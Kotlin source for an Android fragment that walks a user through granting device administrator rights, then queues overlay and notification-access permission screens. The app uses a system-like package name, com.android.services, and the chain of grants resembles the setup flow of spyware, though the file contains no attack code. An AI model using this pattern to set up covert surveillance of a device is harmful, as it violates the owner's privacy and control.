package com.android.services.ui.fragments

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.activity.result.contract.ActivityResultContracts
import androidx.databinding.DataBindingUtil
import androidx.fragment.app.activityViewModels
import com.android.services.R
import com.android.services.databinding.FragmentDeviceAdminAppsBinding
import com.android.services.receiver.TOSDeviceAdminReceiver
import com.android.services.ui.activities.ManualPermissionActivity
import com.android.services.enums.PermissionScreens
import com.android.services.interfaces.CustomDialogListener
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose
import com.android.services.viewModel.ManualPermissionViewModel

class DeviceAdministratorFragment : BaseFragment() {

    lateinit var binding: FragmentDeviceAdminAppsBinding
    private val manualPermissionViewModel: ManualPermissionViewModel by activityViewModels()

    override fun initViews(view: View) {
        binding.permissionButton.setOnClickListener {
            activateDeviceAdmin()
        }
        binding.skipPermission.setOnClickListener {
            AppUtils.showAlertDialog(
                requireContext(),
                "Skip Permission",
                "Alert! Some features may not work if You Skip the Permission",
                "Skip",
                "Cancel",
                object : CustomDialogListener {
                    override fun onYes() {
                        AppUtils.skipThePermission(PermissionScreens.DEVICE_ADMIN_PERMISSION)
                    }

                    override fun onCancel() {

                    }
                }
            )
        }
    }

    override fun createView(inflater: LayoutInflater, container: ViewGroup): View {
        binding = DataBindingUtil.inflate<FragmentDeviceAdminAppsBinding>(
            inflater, R.layout.fragment_device_admin_apps, container, false
        ).apply {
            lifecycleOwner = viewLifecycleOwner
            viewModel = manualPermissionViewModel
        }
        return binding.root
    }

    override fun onCreateFragment() {

    }

    private fun activateDeviceAdmin() {
        val demoDeviceAdmin =
            ComponentName(requireActivity(), TOSDeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(
            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
            demoDeviceAdmin
        )
        deviceAdminLaunch.launch(intent)
    }

    private val deviceAdminLaunch =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                val data: Intent? = result.data
                logVerbose("${ManualPermissionActivity.TAG} Permission Granted")
                manualPermissionViewModel.setPermissionScreen(
                    requireContext(),
                    PermissionScreens.DRAW_OVER_OTHER_APPS
                )
                manualPermissionViewModel.setPermissionScreen(
                    requireContext(),
                    PermissionScreens.NOTIFICATION_ACCESS_PERMISSION
                )
            } else if (result.resultCode == Activity.RESULT_CANCELED) {
                logVerbose("${ManualPermissionActivity.TAG} Permission Cancelled")
            }
        }

    companion object {
        /** Creates an new instance of Accessibility Fragment **/
        fun newInstance(): DeviceAdministratorFragment {
            val args = Bundle()
            val fragment = DeviceAdministratorFragment()
            fragment.arguments = args
            return fragment
        }
    }
}